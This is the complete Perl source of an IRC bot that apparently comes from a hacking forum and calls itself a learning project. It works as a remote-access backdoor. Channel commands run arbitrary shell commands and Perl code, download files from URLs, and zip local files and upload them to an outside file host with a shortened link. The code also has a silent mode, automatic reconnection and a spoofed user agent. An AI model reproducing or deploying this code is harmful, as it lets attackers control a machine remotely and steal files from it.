#!/usr/bin/perl -w
#Purpose no.1: learning & fun
#
#Github: https://github.com/hcac/zmb2
#For documentation see "HELP.txt" on Github
#
#This is an IRC bot script in Perl
#
#Evilzone <3
#written by hcac

use strict; #as always
use warnings;
use threads; #multitasking
use Switch; #less IFs
use Net::Ping; #for connectivity checks
use IO::Socket::INET; #for connecting to IRC server
use LWP::Simple qw (getstore); #for downloading
use LWP::UserAgent; #uploading files and generating QR codes online
use HTTP::Request::Common qw (POST); #^
use Archive::Zip; #zipping files before uploading
use Cwd; #changing/knowing current working directory

$| = 1; #hot IO

#general configuration
my $silent = 0; #change it to 1 for on
my $server = '127.0.0.1';
my $port = 6667;
my $channel = '#lab';
my $nick_prefix = "test";
my $user = "ISOMER 8 * :sum it up";
#END

if ($silent == 1) {
	close(STDOUT);
	close(STDERR);
}

my ($socket, $thr_keep_connection, $reply_to); #outer, for every sub to see

main();

sub main { #the whole as a subrouting to make it reconnecetable

	#Internal Variables
	my $bot = 0; #this tells the bot to or not to apply commands
	
	my $thr_connect = threads->create(\&func_connect); 
	#$thr_connect a thread for making our socket
	#this is the first time I do this, so it probably has,
	#some issues with pointers, so use with caution
	
	$socket = $thr_connect->join; #get the made socket
	
	$thr_keep_connection = threads->create(\&func_keep_connection,
		\$socket); #this is a little funny and I'm not sure about it
	
	while (my $line = <$socket>) {
		$SIG{HUP} = sub { exec($^X, $0) }; #restarts the whole
		
		if ($line =~ /PING/i) { #answer to ping requests
			my @ping_args = split(/\s/, $line, 2);
			my $ping_code = $ping_args[1];
			print $socket "PONG $ping_code\n";
		}
		
		next if ($line !~ /PRIVMSG/i);
		
		my @params = split(/\s/, $line, 4);
		#take the server message into parts
		
		my ($full_from, undef, $to, $msg) = @params;
		#gathering info
		
		my ($from) = $full_from =~ /:(.+)!/;
		#the nick of sender
		
		$reply_to = ($to eq $channel) ? $to : $from;
		#the results of commands 'll be sent to $reply_to
		
		$msg =~ s/://;
		
		#we finished our information gathering
		#now we're going to apply the commands
		
		$bot = 1 if ($msg =~ /!BOT\son/i); #bot on
		$bot = 0 if ($msg =~ /!BOT\soff/i); #bot off
	
		next if ($bot == 0); #don't apply any commands if bot was off
		
		#------THE START OF APPLYING COMMANDS
		
		switch ($msg) {
			case /^!CMD/i { command_center(\&func_cmd, $msg, 2) }
			case /^!PERL/i { command_center(\&func_perl, $msg, 2) }
			case /^!IRC/i { $msg =~ s/^!IRC\s//i; print $socket "$msg\n"; }
			case /^!UP/i { command_center(\&func_up_and_shorten, $msg, 2) }
			case /^!GET/i { command_center(\&func_get, $msg, 3) }
			case /^!QR/i { command_center(\&genQR, $msg, 2) }
			case /^!EXIT/i { exit }
		}
		
		sub command_center { #this is where commands are mostly interpreted
			#return -1 if (!$_[0] || $![1]);
			my ($func_p, $msg, $count) = (shift @_, shift @_, shift @_);
			
			my @cmd_args = split(/\s/, $msg, $count);
			#extracts the parameters of the command sent to bot
			
			$_ =~ s/(\r|\n)(\r|\n)$// foreach (@cmd_args);
			
			my @params;
			push(@params, $cmd_args[$_]) foreach (1 .. $count - 1);
			
			my $thr_cmd = threads->create($func_p, @params);
			#using "threads" to avoid some crashes
			
			my $thr_cmd_result = $thr_cmd->join; #get the results
			my $cmd_result = ($thr_cmd_result) ? $thr_cmd_result : "Done";
			#results can be null like "rm -rf *" so we want to know if done
			
			my $bot_msg = "PRIVMSG $reply_to :$cmd_result";
			$bot_msg = substr($bot_msg, 0,508);
			#to always ensure that it's not more than IRC limits
			print $socket $bot_msg . "\n";
}
		#------THE END OF APPLYING COMMANDS
	}
	
	$thr_keep_connection->join;
}

main(); #Don't really want this to finish!

#internal functions
#used by the "applying commands" section

sub func_connect { #tries to connect 'till success
	while (!defined ($socket = IO::Socket::INET->new (
			PeerAddr => $server,
			PeerPort => $port,
			Timeout => 10
		))) {
		sleep 10;
	}
	
	if ($socket) { #tell the IRC server who you are
	
		print $socket "USER $user\n";
		my $randnum = int rand 9999;
		print $socket "NICK $nick_prefix$randnum\n"; #always a new nick
		print $socket "JOIN $channel\n";
	
		return $socket;
	}
}

sub func_keep_connection {
	my $socket_ref = $_[0];
	my $socket = $$socket_ref;
	
	while (1) {
		print $socket "\n" || kill HUP => $$;
		sleep 20;
	}
}

sub func_cmd { #just runs the command with backticks and returns the results
	return -1 if (!$_[0]);
	my $command = $_[0];
	return `$command`;
}

sub func_perl { #eval() and returns the returned value
	return -1 if (!$_[0]);
	my $command = $_[0];
	return eval($command);
}

sub func_up_and_shorten { #to mix the both functions
	return -1 if (!$_[0]);
	my $file = $_[0];
	
	my $long_url = upload($file);
	
	return shorten($long_url) if ($long_url !~ /-1/);
	
	return -1;
}

sub func_get { #downloading a file with getstore()
	return -1 if (!$_[0] || !$_[1]);
	
	getstore($_[0], $_[1]) || return -1;
	#return -1 if couldn't download from the URL
	
	return 0;
}

sub genQR {
	return -1 if (!$_[0]);
	
	my $toqr = "";
	my $randnum = int(rand(9999));
	my $saved_img = $randnum . '.png';
	my $qr_gen_url = 'https://api.qrserver.com/v1/create-qr-code/?data=';
	print $_[0];
	if (-r $_[0]) { #if the given thing is a readable file's name
		my $data = "";
		
		open(FH, $_[0]);
		$data .= $_ while (<FH>);
		close(FH);
		
		$toqr = substr($data, 0, 300); #ensure to obey the QR limits
	}
	else { #if not, just qr the text
		$toqr = substr($_[0], 0, 300);
	}
	
	getstore($qr_gen_url . $toqr, $saved_img);
	
	return cwd . '/' . $saved_img; #returning the full path of img
}

sub upload {
	return -1 if (!$_[0]);
	
	my $file = $_[0];
	
	my ($to_upload, $zipped);
	
	if ($file !~ /\.(zip|txt)$/) { #unfilter txt and zip exts
		#zip should not be re-zipped! so...
		
		#make the file ready
		my $zip = new Archive::Zip;
		$zip->addFile($file);
		
		my $randnum = int(rand 99999); #always a random filename
		$to_upload = $randnum . '.zip'; #tells to upload the zipped file
		
		$zip->writeToFileNamed($randnum . '.zip'); #compression starts
		
		$zipped = 1; #to know that WE zipped the file
		#becomes handy when auto-removing the auto-zipped file
	}
	else {
		$to_upload = $file; #if it's a txt, then just upload it
	}
	
	#uploading process starts
	my $req = POST 'http://s000.tinyupload.com/cgi-bin/upload.cgi',
			Content_Type => 'multipart/form-data',
			Content => [uploaded_file => [$to_upload]];
	#initializing our post request
	
	$req->header('Content-Type' => 'multipart/form-data');
	$req->header(Referer => '');
	
	my $ua = LWP::UserAgent->new(requests_redirectable => ['GET', 'POST', 'HEAD']);
	
	$ua->agent('Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)');
	$ua->cookie_jar({});
	
	my $content = $ua->request($req)->as_string;
	
	unlink($to_upload) if ($zipped);
	
	my ($code) = $content =~ /file_id=(\d+)/;
	#the only thing we need to generate the link
	
	return ($code) ? 'http://s000.tinyupload.com/?file_id=' . $code : -1;
	#returns the link if a code was generated by the website
}

sub shorten { #simple URL shortner :D
	return -1 if (!$_[0]);
	
	my $url = $_[0];
	
	my $req = new HTTP::Request(POST => 'http://leggy.io/api/v1/shorten');
	#post request is now ready
	
	$req->header('Content-Type' => 'application/json'); #needed headers
	$req->content('{"longUrl":"' . $url . '"}'); #API content
	
	my $ua = new LWP::UserAgent;
	
	my $result = $ua->request($req)->content;
	my @param = split('"', $result);
	
	return ($param[7]) ? $param[7] : -1;
	#tell if failed or just give back the link
}
